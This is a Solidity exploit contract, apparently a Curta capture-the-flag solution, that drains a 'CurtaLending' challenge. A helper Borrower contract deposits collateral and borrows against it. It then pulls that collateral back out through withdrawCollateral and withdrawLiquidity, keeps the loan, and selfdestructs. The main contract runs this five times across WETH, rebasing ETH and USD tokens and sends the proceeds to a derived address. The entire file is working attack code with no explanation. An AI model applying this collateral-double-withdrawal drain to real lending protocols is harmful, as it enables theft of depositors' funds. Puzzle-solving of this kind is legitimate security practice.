pragma solidity 0.8.20;

import "src/CurtaLending.sol";


contract Borrower {
  function doBorrow(address lending, address collateral, address borrowAsset, uint256 amount) external {
    IERC20(collateral).approve(lending, 1e40);

    CurtaLending(lending).depositCollateral(collateral, 10000 ether);
    CurtaLending(lending).borrow(collateral, borrowAsset, amount);
    CurtaLending(lending).withdrawCollateral(collateral, 0); 
    CurtaLending(lending).withdrawLiquidity(collateral, 10000 ether); 

    IERC20(collateral).transfer(msg.sender, IERC20(collateral).balanceOf(address(this)));
    IERC20(borrowAsset).transfer(msg.sender, IERC20(borrowAsset).balanceOf(address(this)));

    selfdestruct(payable(msg.sender));
  }
}

interface Curta {
  function solve(uint32, uint256) external;
}

contract Exp {
  function run(address instance, address solver) public {
    uint256 seed = uint256(keccak256(abi.encode(solver)));
    address to = address(uint160(seed));

    Challenge challenge = Challenge(instance);
    CurtaToken curtaUSD = challenge.curtaUSD();
    CurtaToken curtaWETH = challenge.curtaWETH();
    CurtaRebasingToken curtaRebasingETH = challenge.curtaRebasingETH();
    CurtaLending lending = challenge.curtaLending();

    uint256 wethBalance;

    Borrower borrower = new Borrower();
    wethBalance = curtaWETH.balanceOf(address(this));
    curtaWETH.transfer(address(borrower), wethBalance);
    borrower.doBorrow(address(lending), address(curtaWETH), address(curtaWETH), 6000 ether);

    borrower = new Borrower();
    wethBalance = curtaWETH.balanceOf(address(this));
    curtaWETH.transfer(address(borrower), wethBalance);
    borrower.doBorrow(address(lending), address(curtaWETH), address(curtaWETH), 4000 ether);

    borrower = new Borrower();
    wethBalance = curtaWETH.balanceOf(address(this));
    curtaWETH.transfer(address(borrower), wethBalance);
    borrower.doBorrow(address(lending), address(curtaWETH), address(curtaRebasingETH), 6000 ether);

    borrower = new Borrower();
    wethBalance = curtaWETH.balanceOf(address(this));
    curtaWETH.transfer(address(borrower), wethBalance);
    borrower.doBorrow(address(lending), address(curtaWETH), address(curtaRebasingETH), 4000 ether);
    
    borrower = new Borrower();
    wethBalance = curtaWETH.balanceOf(address(this));
    curtaWETH.transfer(address(borrower), wethBalance);
    borrower.doBorrow(address(lending), address(curtaWETH), address(curtaUSD), 10000 ether);

    curtaRebasingETH.withdraw(10000 ether);

    curtaUSD.transfer(to, 20000 ether);
    curtaWETH.transfer(to, 30000 ether);
  }
}

